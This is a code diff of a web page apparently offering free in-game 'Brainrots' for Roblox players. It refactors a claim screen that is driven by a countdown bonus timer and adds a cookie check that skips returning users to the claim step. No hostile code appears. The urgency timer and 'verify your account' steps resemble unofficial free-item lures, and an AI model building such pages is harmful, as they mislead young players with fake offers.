-            let loaded = false;
-            img.onload = () => { if (!loaded) { loaded = true;
-                avatarEl.src = robloxAvatarUrl; } };
-            img.onerror = () => { if (!loaded) { loaded = true;
-                avatarEl.src = defaultAvatar; } };
-            img.src = robloxAvatarUrl;
-            setTimeout(() => { if (!loaded) { loaded = true;
-                avatarEl.src = defaultAvatar;
-                img.src = ''; } }, 3000);
-
-            // Update offer steps based on timer
-            const offerSteps = document.querySelector('.offer-steps');
-            if (bonusActive && offerSteps) {
-                offerSteps.innerHTML = `
-              <span>1.</span> Verify your Roblox account<br>
-              <span>2.</span> Join the Steal a Brainrot experience<br>
-              <span>3.</span> Claim your reward in-game<br>
-              <span style="color:#ffd700;">⭐</span> <strong style="color:#ffd700;">+2 Bonus Brainrots ACTIVE!</strong>
-            `;
-            } else if (offerSteps) {
-                offerSteps.innerHTML = `
-              <span>1.</span> Verify your Roblox account<br>
-              <span>2.</span> Join the Steal a Brainrot experience<br>
-              <span>3.</span> Claim your reward in-game<br>
-              <span style="color:#ff6b6b;">⏰</span> <strong style="color:#ff6b6b;">Bonus window expired</strong>
-            `;
-            }
-
-            document.getElementById('display-username').textContent = username;
-
-            // Hide main layout, show success
-            document.getElementById('main-layout').style.display = 'none';
-            document.getElementById('prize-banner').style.display = 'none';
-            document.getElementById('success-screen').style.display = 'flex';
-
+            showClaimScreen(username, bonusActive);
             setTimeout(launchConfetti, 200);
         });
 
@@ -1256,6 +991,17 @@
         document.getElementById('continue-button').addEventListener('click', () => {
             window.location.href = 'https://www.roblox.com';
         });
+
+        /* ── On page load: check if already registered ── */
+        (function init() {
+            const savedUser = getCookie('brainrot_registered');
+            if (savedUser) {
+                // User already registered – go straight to claim screen
+                showClaimScreen(savedUser, !timerExpired);
+                // Re‑launch confetti for fun
+                setTimeout(launchConfetti, 400);
+            }
+        })();
     </script>
 </body>
 </html>
